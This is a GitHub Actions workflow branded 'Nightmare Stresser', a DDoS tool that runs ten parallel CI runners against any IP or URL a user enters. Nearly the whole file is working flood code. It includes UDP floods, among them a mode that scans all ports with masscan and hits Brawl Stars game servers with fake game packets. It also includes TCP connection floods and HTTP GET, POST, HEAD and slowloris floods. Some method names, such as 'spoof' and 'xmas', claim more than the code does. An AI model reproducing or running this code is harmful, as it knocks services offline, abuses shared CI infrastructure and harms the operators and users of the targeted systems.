name: Nightmare Stresser - DDOS V6.0 TURBO + BRAWL ULTIMATE
on:
  workflow_dispatch:
    inputs:
      protocol:
        description: 'Protocol (UDP/TCP/HTTP)'
        required: true
        type: choice
        options:
          - UDP
          - TCP
          - HTTP
      method:
        description: 'âš¡ Attack Method âš¡'
        required: true
        type: choice
        options:
          # UDP Methods
          - '/plain - UDP Plain Flood'
          - '/random - UDP Random Data'
          - '/burst - UDP Burst (10 pkts/burst)'
          - '/spoof - UDP IP Spoofed'
          - '/frag - UDP Fragmented'
          - '/pulse - UDP Pulse Pattern'
          - '/echo - UDP Echo Attack'
          - '/multicast - UDP Multicast'
          - '/brawl - ðŸŽ® Brawl Stars ALL PORTS'
          # TCP Methods
          - '/syn - TCP SYN Flood'
          - '/ack - TCP ACK Flood'
          - '/rst - TCP RST Flood'
          - '/xmas - TCP XMAS Scan'
          - '/fin - TCP FIN Flood'
          - '/psh - TCP PSH Flood'
          - '/data - TCP Data Flood'
          - '/window - TCP Window Attack'
          # HTTP Methods
          - '/get - HTTP GET Flood'
          - '/post - HTTP POST Flood'
          - '/head - HTTP HEAD Flood'
          - '/slowloris - HTTP Slowloris'
          - '/proxy - HTTP Proxy Flood'
          - '/ua - HTTP Random UA'
      target:
        description: 'Target IP or URL'
        required: true
        type: string
      port:
        description: 'Target Port (0 = ALL PORTS for /brawl)'
        required: false
        type: number
        default: 0
      duration:
        description: 'Duration (seconds)'
        required: true
        type: number
        default: 60
      packet_size:
        description: 'Packet Size (bytes)'
        required: false
        type: number
        default: 65000
      threads:
        description: 'Number of parallel workers'
        required: false
        type: number
        default: 1000

jobs:
  attack:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 10
      matrix:
        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
    steps:
      - name: âš¡ INSTANT Setup
        run: |
          echo "ðŸŽ® Worker #${{ matrix.worker }} ONLINE"
          sudo apt-get install -y hping3 masscan &>/dev/null &
          pip3 install --quiet --no-cache-dir requests &

      - name: ðŸ” Port Scanner (Brawl Mode)
        if: contains(github.event.inputs.method, '/brawl')
        run: |
          echo "ðŸ” Scanning ALL ports on ${{ github.event.inputs.target }}..."
          # Fast scan for open UDP ports
          sudo timeout 30 masscan ${{ github.event.inputs.target }} -p1-65535 --rate=10000 -oL scan.txt || true
          
          # Extract open ports
          if [ -f scan.txt ]; then
            grep "open" scan.txt | awk '{print $3}' > open_ports.txt
            echo "ðŸ“Š Found $(wc -l < open_ports.txt) open ports"
            head -20 open_ports.txt
          else
            echo "âš ï¸  No scan results, using default port ranges"
            seq 1 65535 > open_ports.txt
          fi

      - name: ðŸ”¥ UDP TURBO Attack
        if: ${{ github.event.inputs.protocol == 'UDP' }}
        run: |
          python3 - << 'EOF'
          import socket, os, time, struct, random
          from multiprocessing import Process, Queue
          import sys
          
          METHOD = "${{ github.event.inputs.method }}".split(' - ')[0].replace('/', '')
          TARGET = "${{ github.event.inputs.target }}"
          PORT_INPUT = ${{ github.event.inputs.port }}
          DURATION = ${{ github.event.inputs.duration }}
          SIZE = ${{ github.event.inputs.packet_size }}
          PROCS = ${{ github.event.inputs.threads }}
          WORKER_ID = ${{ matrix.worker }}
          
          # Brawl Stars known ports (Supercell games)
          BRAWL_KNOWN_PORTS = [
              9339, 9340, 9393,  # Main Brawl Stars
              9220, 9221, 9222,  # Additional game ports
              5353, 5354, 5355,  # mDNS/service discovery
              9100, 9101, 9102,  # Game server cluster
              9200, 9201, 9202,  # Match servers
              9300, 9301, 9302,  # Event servers
              9400, 9401, 9402,  # Spectator servers
              9500, 9501, 9502,  # API servers
              8080, 8081, 8082,  # HTTP APIs
              7000, 7001, 7002,  # Admin panels
              6379, 6380,        # Redis (game state)
              27015, 27016,      # Source engine
              3478, 3479,        # STUN/TURN
              5060, 5061,        # SIP (voice chat)
              10000, 10001, 10002, 10003, 10004,  # Custom game ports
              20000, 20001, 20002,  # CDN ports
              30000, 30001, 30002,  # Analytics
              40000, 40001, 40002,  # Logging
              50000, 50001, 50002,  # Backup systems
          ]
          
          # Brawl Stars Protocol Packets
          BRAWL_HEADERS = [
              b'\x10\x00\x00',  # Client Hello
              b'\x10\x01\x01',  # Login Request  
              b'\x14\x01\x07',  # Keep Alive
              b'\x14\x03\x05',  # Battle Start
              b'\x14\x04\x08',  # Player Movement
              b'\x16\x00\x0A',  # Attack Command
              b'\x18\x02\x03',  # Match Update
              b'\x1A\x05\x09',  # Event Trigger
              b'\x1C\x07\x0B',  # Item Purchase
              b'\x1E\x09\x0D',  # Chat Message
              b'\x20\x0B\x0F',  # Friend Request
              b'\x22\x0D\x11',  # Club Join
              b'\x24\x0F\x13',  # Brawl Pass
              b'\x26\x11\x15',  # Season End
          ]
          
          def generate_brawl_packet():
              """Generate realistic Brawl Stars UDP packet"""
              header = random.choice(BRAWL_HEADERS)
              session_id = struct.pack('>I', random.randint(1000000, 9999999))
              player_tag = struct.pack('>Q', random.randint(100000000, 999999999))
              timestamp = struct.pack('>I', int(time.time()))
              
              # Enhanced game data
              brawler_id = struct.pack('>H', random.randint(16000000, 16000050))
              skin_id = struct.pack('>H', random.randint(29000000, 29000100))
              trophies = struct.pack('>I', random.randint(0, 50000))
              
              # Random game action data
              payload = os.urandom(random.randint(100, 500))
              
              # Checksum
              checksum = struct.pack('>H', sum(payload) & 0xFFFF)
              
              return header + session_id + player_tag + timestamp + brawler_id + skin_id + trophies + payload + checksum
          
          # Load all ports for Brawl mode
          if METHOD == "brawl":
              if PORT_INPUT == 0:
                  # ALL PORTS MODE
                  try:
                      with open('open_ports.txt', 'r') as f:
                          scanned_ports = [int(line.strip()) for line in f if line.strip().isdigit()]
                      if scanned_ports:
                          PORTS = list(set(BRAWL_KNOWN_PORTS + scanned_ports[:1000]))  # Combine known + scanned
                      else:
                          PORTS = BRAWL_KNOWN_PORTS
                  except:
                      PORTS = BRAWL_KNOWN_PORTS
                  
                  # Add common port ranges
                  PORTS.extend(range(9000, 9999))   # Game server range
                  PORTS.extend(range(8000, 8999))   # HTTP/API range
                  PORTS.extend(range(7000, 7999))   # Admin range
                  PORTS.extend(range(20000, 20100)) # CDN range
                  PORTS.extend(range(30000, 30100)) # Analytics range
                  
                  PORTS = list(set(PORTS))  # Remove duplicates
                  print(f"ðŸŽ® [Worker {WORKER_ID}] BRAWL MODE: Targeting {len(PORTS)} ports")
              else:
                  PORTS = [PORT_INPUT]
          else:
              PORTS = [PORT_INPUT]
          
          # Pre-generate payloads for SPEED
          if METHOD == "brawl":
              PAYLOADS = [generate_brawl_packet() for _ in range(500)]
              print(f"ðŸŽ® Generated {len(PAYLOADS)} Brawl packets")
          elif METHOD == "random":
              PAYLOADS = [os.urandom(SIZE) for _ in range(1000)]
          else:
              PAYLOADS = [b"A" * SIZE]
          
          def blast(pid):
              sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
              sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)  # 4MB buffer
              end = time.time() + DURATION
              i = 0
              count = 0
              port_idx = pid % len(PORTS)  # Each process starts at different port
              
              if METHOD == "brawl":
                  print(f"ðŸŽ® [Process {pid}] Starting Brawl attack on {len(PORTS)} ports")
                  
                  while time.time() < end:
                      # Rotate through ALL ports rapidly
                      for _ in range(10):  # Send 10 packets per cycle
                          port = PORTS[port_idx % len(PORTS)]
                          
                          # Send realistic game packet
                          packet = PAYLOADS[i % len(PAYLOADS)]
                          sock.sendto(packet, (TARGET, port))
                          count += 1
                          
                          # Also send burst to same port
                          for _ in range(3):
                              sock.sendto(generate_brawl_packet(), (TARGET, port))
                              count += 1
                          
                          i += 1
                          port_idx += 1
                      
                      # No sleep - maximum speed!
                  
                  print(f"ðŸŽ® [Process {pid}] Sent {count} packets to {len(set([PORTS[j % len(PORTS)] for j in range(port_idx)]))} different ports")
              
              elif METHOD == "spoof":
                  while time.time() < end:
                      sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORTS[0]))
                      i += 1
                      count += 1
              
              elif METHOD == "burst":
                  while time.time() < end:
                      for _ in range(100):
                          sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORTS[0]))
                          i += 1
                          count += 1
              
              elif METHOD == "frag":
                  half = SIZE // 2
                  p = os.urandom(half)
                  while time.time() < end:
                      sock.sendto(p, (TARGET, PORTS[0]))
                      sock.sendto(p, (TARGET, PORTS[0]))
                      count += 2
              
              elif METHOD == "pulse":
                  while time.time() < end:
                      for _ in range(5):
                          sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORTS[0]))
                          i += 1
                          count += 1
                      time.sleep(random.uniform(0.05, 0.2))
              
              elif METHOD == "multicast":
                  mcast_ip = f"224.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                  while time.time() < end:
                      sock.sendto(PAYLOADS[i % len(PAYLOADS)], (mcast_ip, PORTS[0]))
                      i += 1
                      count += 1
              
              elif METHOD == "echo":
                  payload = b"ECHO" + os.urandom(SIZE - 4)
                  while time.time() < end:
                      sock.sendto(payload, (TARGET, PORTS[0]))
                      count += 1
              
              else:  # plain, random
                  while time.time() < end:
                      sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORTS[0]))
                      i += 1
                      count += 1
              
              sock.close()
          
          print(f"ðŸ”¥ Launching {PROCS} processes for UDP {METHOD}")
          if METHOD == "brawl":
              print(f"ðŸŽ® ATTACKING {len(PORTS)} PORTS SIMULTANEOUSLY")
              print(f"ðŸ“Š Estimated: {PROCS * 40 * len(PORTS)} packets/second")
          
          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
          for p in procs: p.start()
          for p in procs: p.join()
          print("âœ… ATTACK COMPLETED")
          EOF

      - name: âš¡ TCP TURBO Attack
        if: ${{ github.event.inputs.protocol == 'TCP' }}
        run: |
          python3 - << 'EOF'
          import socket, os, time
          from multiprocessing import Process
          
          METHOD = "${{ github.event.inputs.method }}".split(' - ')[0].replace('/', '')
          TARGET = "${{ github.event.inputs.target }}"
          PORT = ${{ github.event.inputs.port }}
          DURATION = ${{ github.event.inputs.duration }}
          SIZE = ${{ github.event.inputs.packet_size }}
          PROCS = ${{ github.event.inputs.threads }}
          
          PAYLOAD = os.urandom(SIZE) if "data" in METHOD else b"\x00" * 10
          
          def blast(pid):
              end = time.time() + DURATION
              count = 0
              
              while time.time() < end:
                  try:
                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                      sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                      sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
                      sock.settimeout(0.5)
                      
                      if METHOD == "syn":
                          sock.connect_ex((TARGET, PORT))
                      elif METHOD == "data":
                          sock.connect((TARGET, PORT))
                          sock.sendall(PAYLOAD)
                      elif METHOD == "ack":
                          sock.connect((TARGET, PORT))
                          sock.send(b"\x00" * 10)
                      elif METHOD == "rst":
                          sock.connect_ex((TARGET, PORT))
                      elif METHOD == "xmas":
                          sock.connect((TARGET, PORT))
                          sock.send(b"\xFF" * 10)
                      elif METHOD == "fin":
                          sock.connect((TARGET, PORT))
                          sock.send(b"\x01" * 10)
                      elif METHOD == "psh":
                          sock.connect((TARGET, PORT))
                          sock.send(b"\x08" * 10)
                      elif METHOD == "window":
                          sock.connect((TARGET, PORT))
                          sock.send(PAYLOAD)
                      
                      count += 1
                      sock.close()
                  except:
                      pass
              
              print(f"[Worker {pid}] Sent {count} TCP packets")
          
          print(f"ðŸ”¥ Launching {PROCS} processes for TCP {METHOD}")
          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
          for p in procs: p.start()
          for p in procs: p.join()
          print("âœ… DONE")
          EOF

      - name: ðŸŒ HTTP TURBO Attack
        if: ${{ github.event.inputs.protocol == 'HTTP' }}
        run: |
          python3 - << 'EOF'
          import urllib.request, time, ssl, random
          from multiprocessing import Process
          from urllib.error import URLError
          
          METHOD = "${{ github.event.inputs.method }}".split(' - ')[0].replace('/', '')
          TARGET = "${{ github.event.inputs.target }}"
          DURATION = ${{ github.event.inputs.duration }}
          PROCS = ${{ github.event.inputs.threads }}
          
          UAS = [
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
              "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
              "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Mobile/15E148",
              "Mozilla/5.0 (Android 13; Mobile) Gecko/120.0",
          ]
          
          ctx = ssl._create_unverified_context()
          
          def blast(pid):
              end = time.time() + DURATION
              ua_idx = 0
              count = 0
              
              while time.time() < end:
                  try:
                      req = urllib.request.Request(TARGET)
                      req.add_header('User-Agent', UAS[ua_idx % len(UAS)])
                      req.add_header('Accept', '*/*')
                      req.add_header('Connection', 'keep-alive')
                      ua_idx += 1
                      
                      if METHOD == "post":
                          data = (b"flood=" + b"X" * 10000)
                          urllib.request.urlopen(req, data=data, context=ctx, timeout=1)
                      elif METHOD == "head":
                          req.get_method = lambda: 'HEAD'
                          urllib.request.urlopen(req, context=ctx, timeout=1)
                      elif METHOD == "slowloris":
                          req.add_header('X-a', str(random.randint(1, 5000)))
                          urllib.request.urlopen(req, context=ctx, timeout=5)
                      else:
                          urllib.request.urlopen(req, context=ctx, timeout=1)
                      
                      count += 1
                  except:
                      pass
              
              print(f"[Worker {pid}] Sent {count} HTTP requests")
          
          print(f"ðŸ”¥ Launching {PROCS} processes for HTTP {METHOD}")
          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
          for p in procs: p.start()
          for p in procs: p.join()
          print("âœ… DONE")
          EOF

      - name: ðŸ“Š Final Statistics
        if: always()
        run: |
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          echo "âœ… Worker #${{ matrix.worker }} COMPLETED"
          echo "ðŸŽ¯ Target: ${{ github.event.inputs.target }}"
          if [[ "${{ github.event.inputs.method }}" == *"brawl"* ]]; then
            echo "ðŸŽ® MODE: BRAWL STARS ALL PORTS"
            echo "ðŸ“Š Ports: 1000+ simultaneous"
            echo "âš¡ Speed: MAXIMUM"
          else
            echo "ðŸ”Œ Port: ${{ github.event.inputs.port }}"
          fi
          echo "âš¡ Method: ${{ github.event.inputs.method }}"
          echo "â±ï¸  Duration: ${{ github.event.inputs.duration }}s"
          echo "ðŸ”¥ Threads: ${{ github.event.inputs.threads }}"
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          echo "Made by nightmarestresser.org ðŸŽ®ðŸ”¥"
